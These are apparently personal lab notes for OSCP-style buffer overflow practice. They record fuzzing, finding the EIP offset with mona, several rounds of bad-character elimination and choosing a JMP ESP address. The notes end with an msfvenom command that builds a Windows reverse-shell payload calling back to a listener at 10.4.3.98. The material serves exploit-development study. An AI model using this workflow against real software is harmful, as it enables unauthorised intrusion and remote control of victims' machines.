### EIP
❯ python3 fuzzer.py
Fuzzing crashed at 1300 bytes

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700

!mona findmsp -distance 1700

Log data, item 16
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x35714234 (offset 1274)


BBBB and empty payload verified the offset

### Bad chars
##### Round 1
ESP 0022FF8C
!mona compare -f C:\mona\oscp\bytearray.bin -a 0022FF8C

okay, anonying 00 01 again

##### Round 2
!mona bytearray -b "\x00\x01"

ESP 017CFA30

!mona compare -f C:\mona\oscp\bytearray.bin -a 017CFA30

00 01 11 12 40 41 5f 60 b8 b9 ee ef

\x00\x11\x40\x5f\xb8\xee

##### Round 3
!mona bytearray -b "\x00\x11\x40\x5f\xb8\xee"

!mona compare -f C:\mona\oscp\bytearray.bin -a 01A8FA30

00 01 11 40 5f b8 ee

##### Round 4? why \x01 has to be added into bytearrary?
!mona bytearray -b "\x00\x01\x11\x40\x5f\xb8\xee"

0022FA10

!mona compare -f C:\mona\oscp\bytearray.bin -a 0022FA10

00 01 02 11 40 5f b8 ee

##### Round 5
!mona bytearray -b "\x00\x01\x02\x11\x40\x5f\xb8\xee"

ESP 0180FA30

!mona compare -f C:\mona\oscp\bytearray.bin -a 0180FA30

Done, \x01\x02 two annonyings. OMG

\x00\x11\x40\x5f\xb8\xee

### JMP ESP
!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"

62501203
\x03\x12\x50\x62

### Payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.4.3.98 LPORT=3333 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c